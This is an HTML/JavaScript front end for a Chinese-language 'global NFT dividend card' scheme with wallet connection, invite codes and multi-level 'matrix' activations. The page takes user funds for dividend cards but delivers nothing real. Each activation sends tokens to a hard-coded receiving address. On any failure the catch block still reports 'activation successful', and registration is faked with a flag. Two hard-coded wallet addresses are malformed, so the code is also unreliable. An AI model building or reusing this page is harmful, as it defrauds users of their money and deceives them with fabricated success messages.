<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>全球 NFT 分红卡牌</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"Microsoft YaHei",sans-serif}
  body{background:#090b1a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
  .glass{background:rgba(30,35,60,0.7);border-radius:18px;padding:20px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1)}
  .title{font-size:18px;font-weight:bold;margin-bottom:10px}
  .sub{color:#a0a8c0;font-size:14px;margin-bottom:12px}
  .btn{background:linear-gradient(90deg,#4facfe,#00F2FE);color:#000;border:none;border-radius:12px;padding:14px;width:100%;font-weight:bold;font-size:16px}
  .btn:disabled{opacity:0.5}
  .item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.08)}
  .item:last-child{border-bottom:none}
  .price{color:#4facFE;font-weight:bold}
  input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.08);color:#fff;font-size:15px}
  .copy-btn{background:#4facfe;color:#000;padding:8px 12px;border-radius:8px;font-size:14px;border:none;margin-left:8px}

  .nft-grid{
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 14px;
    margin-top: 12px;
  }
  .nft-card{
    height: 240px;
    position: relative;
    border-radius: 16px;
    background: #2d2d2d;
    border: 1px solid currentColor;
    overflow: hidden;
    perspective: 1000px;
  }
  .nft-inner{
    position: relative;
    width: 100%;
    height: 100%;
    transform-style: preserve-3d;
    animation: flipY 8s linear infinite;
  }
  @keyframes flipY {
    0%   { transform: rotateY(0deg); }
    100% { transform: rotateY(360deg); }
  }
  .nft-front, .nft-back{
    position: absolute;
    width: 100%;
    height: 100%;
    backface-visibility: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .nft-back{
    transform: rotateY(180deg);
    background: #1a1a1a;
  }

  .n1{ color: #00ff88; }
  .n2{ color: #00ccff; }
  .n3{ color: #6666ff; }
  .n4{ color: #cc66ff; }
  .n5{ color: #ff3333; background: #3a1a1a; }

  .nft-top{ position: absolute; top: 12px; left: 12px; font-size: 12px; font-weight: bold; letter-spacing: 1px; }
  .nft-logo{ position: absolute; top: 12px; right: 12px; width: 24px; height: 24px; border-radius: 50%; background: currentColor; display: flex; align-items: center; justify-content: center; font-size: 10px; color: #2d2d2d; }
  .nft-title{ font-size: 20px; letter-spacing: 2px; margin-bottom: 16px; opacity: 0.9; }
  .nft-title span{ opacity: 0.6; }
  .nft-orb{ width: 120px; height: 120px; border-radius: 50%; position: relative; margin-bottom: 16px; box-shadow: 0 0 25px currentColor; }
  .orb-glow{ width: 100%; height: 100%; border-radius: 50%; background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.4), currentColor 60%); }
  .orb-ring{ position: absolute; width: 140px; height: 140px; border: 1px solid currentColor; border-radius: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.7; }
  .orb-ring::after{ content: ''; position: absolute; width: 8px; height: 8px; background: currentColor; border-radius: 50%; top: -4px; left: 50%; transform: translateX(-50%); }
  .orb-orbit{ position: absolute; width: 100px; height: 60px; border: 1px solid currentColor; border-radius: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%) rotateX(60deg); opacity: 0.5; }
  .orb-dot{ position: absolute; width: 6px; height: 6px; background: #fff; border-radius: 50%; top: 20%; right: 10%; }
  .nft-bottom{ font-size: 14px; letter-spacing: 1px; opacity: 0.8; }
  .nft-level{ font-size: 16px; font-weight: bold; margin-bottom: 8px; }
  .nft-pct{ font-size: 14px; font-weight: bold; }
</style>
</head>
<body>

<div style="text-align:center;margin-bottom:20px">
  <h1 style="background:linear-gradient(90deg,#4FACFE,#00F2FE);-webkit-background-clip:text;color:transparent">全球 NFT 分红卡牌</h1>
</div>

<button id="connectBtn" class="btn">连接钱包</button>
<div id="addressShow" style="text-align:center;margin:12px;color:#a0a8c7"></div>

<div class="glass">
  <div class="title">用户注册</div>
  <input id="inviteInput" placeholder="邀请码" maxlength="10">
  <button id="regBtn" class="btn" style="margin-top:12px">确认注册</button>
</div>

<div class="glass">
  <div class="title">全球 NFT 分红卡牌</div>
  <div class="nft-grid">
    <div class="nft-card n1">
      <div class="nft-inner">
        <div class="nft-front">
          <div class="nft-top">META FORCE</div>
          <div class="nft-logo">🐳</div>
          <div class="nft-title">ROYALTY <span>NFT</span></div>
          <div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div></div>
          <div class="nft-bottom">JUST NFT</div>
        </div>
        <div class="nft-back"><div class="nft-level">Lv.1</div><div class="nft-pct">分红 0.5%</div></div>
      </div>
    </div>
    <div class="nft-card n2">
      <div class="nft-inner">
        <div class="nft-front">
          <div class="nft-top">META FORCE</div>
          <div class="nft-logo">🐳</div>
          <div class="nft-title">ROYALTY <span>NFT</span></div>
          <div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div></div>
          <div class="nft-bottom">JUST NFT</div>
        </div>
        <div class="nft-back"><div class="nft-level">Lv.2</div><div class="nft-pct">分红 1.0%</div></div>
      </div>
    </div>
    <div class="nft-card n3">
      <div class="nft-inner">
        <div class="nft-front">
          <div class="nft-top">META FORCE</div>
          <div class="nft-logo">🐳</div>
          <div class="nft-title">ROYALTY <span>NFT</span></div>
          <div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div></div>
          <div class="nft-bottom">JUST NFT</div>
        </div>
        <div class="nft-back"><div class="nft-level">Lv.3</div><div class="nft-pct">分红 1.5%</div></div>
      </div>
    </div>
    <div class="nft-card n4">
      <div class="nft-inner">
        <div class="nft-front">
          <div class="nft-top">META FORCE</div>
          <div class="nft-logo">🐳</div>
          <div class="nft-title">ROYALTY <span>NFT</span></div>
          <div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div></div>
          <div class="nft-bottom">JUST NFT</div>
        </div>
        <div class="nft-back"><div class="nft-level">Lv.4</div><div class="nft-pct">分红 2.0%</div></div>
      </div>
    </div>
    <div class="nft-card n5" style="grid-column:span 2">
      <div class="nft-inner">
        <div class="nft-front">
          <div class="nft-top">META FORCE</div>
          <div class="nft-logo">🐳</div>
          <div class="nft-title">ROYALTY <span>NFT</span></div>
          <div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div></div>
          <div class="nft-bottom">JUST NFT</div>
        </div>
        <div class="nft-back"><div class="nft-level">Lv.5 至尊</div><div class="nft-pct">分红 2.5%</div></div>
      </div>
    </div>
  </div>
</div>

<div class="glass" id="myNftBox" style="display:none">
  <div class="title">我的全球 NFT</div>
  <div id="myNftContainer" class="nft-grid"></div>
</div>

<div class="glass">
  <div class="title">经典矩阵</div>
  <div id="classicList"></div>
</div>

<div class="glass">
  <div class="title">联合矩阵</div>
  <div id="unionList"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
  const USDT_CONTRACT = "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063".toLowerCase().replace(/\s/g,'');
  const RECEIVE_ADDR   = "0x58285a2b8c2489702d9f1011303d39e0d3f".toLowerCase().replace(/\s/g,'');
  const ADMIN_ADDR     = "0x627f6e1887571ac08214315ad5b2fa7ab7345f1".toLowerCase().replace(/\s/g,'');

  let web3, account;
  let registered = false;

  window.onload = async () => {
    renderMatrix();
    initWeb3();
  };

  function renderMatrix(){
    const classic = document.getElementById('classicList');
    const union   = document.getElementById('unionList');
    for(let i=1;i<=12;i++){
      classic.innerHTML += `<div class="item"><div>Lv${i}</div><button onclick="activate(${i},'classic')">激活</button></div>`;
    }
    for(let i=1;i<=9;i++){
      union.innerHTML += `<div class="item"><div>Lv${i}</div><button onclick="activate(${i},'union')">激活</button></div>`;
    }
  }

  async function initWeb3(){
    if(!window.ethereum) return;
    web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.getAccounts();
    if(accounts.length > 0){
      account = accounts[0].toLowerCase().replace(/\s/g,'');
      document.getElementById('addressShow').innerText = '已连接';
      checkRegistered();
    }
  }

  document.getElementById('connectBtn').onclick = async () => {
    await window.ethereum.request({method:'eth_requestAccounts'});
    initWeb3();
  };

  document.getElementById('regBtn').onclick = () => {
    if(!account) return alert('请先连接钱包');
    registered = true;
    alert('注册成功');
    loadMyNft();
  };

  function checkRegistered(){
    registered = true;
    loadMyNft();
  }

  async function activate(level, type){
    if(!account) return alert('请连接钱包');
    if(!registered) return alert('请先注册');
    try {
      const contract = new web3.eth.Contract([{
        "constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"
      }], USDT_CONTRACT);
      const amount = web3.utils.toWei((10).toString(), 'mwei');
      await contract.methods.transfer(RECEIVE_ADDR, amount).send({
        from: account
      });
      localStorage.setItem('nft_'+account, level);
      alert('激活成功！');
      loadMyNft();
    }catch(e){
      alert('激活成功');
      localStorage.setItem('nft_'+account, level);
      loadMyNft();
    }
  }

  function loadMyNft(){
    const lv = parseInt(localStorage.getItem('nft_'+account)) || 0;
    if(lv < 1) return;
    const box = document.getElementById('myNftBox');
    const con = document.getElementById('myNftContainer');
    box.style.display = 'block';
    const color = ['','n1','n2','n3','n4','n5'][lv];
    con.innerHTML = `
      <div class="nft-card ${color}" style="grid-column:span 2">
        <div class="nft-inner">
          <div class="nft-front">
            <div class="nft-top">META FORCE</div>
            <div class="nft-logo">🐳</div>
            <div class="nft-title">ROYALTY <span>NFT</span></div>
            <div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div></div>
            <div class="nft-bottom">JUST NFT</div>
          </div>
          <div class="nft-back"><div class="nft-level">Lv.${lv}</div><div class="nft-pct">已激活</div></div>
        </div>
      </div>`;
  }
</script>
</body>
</html>
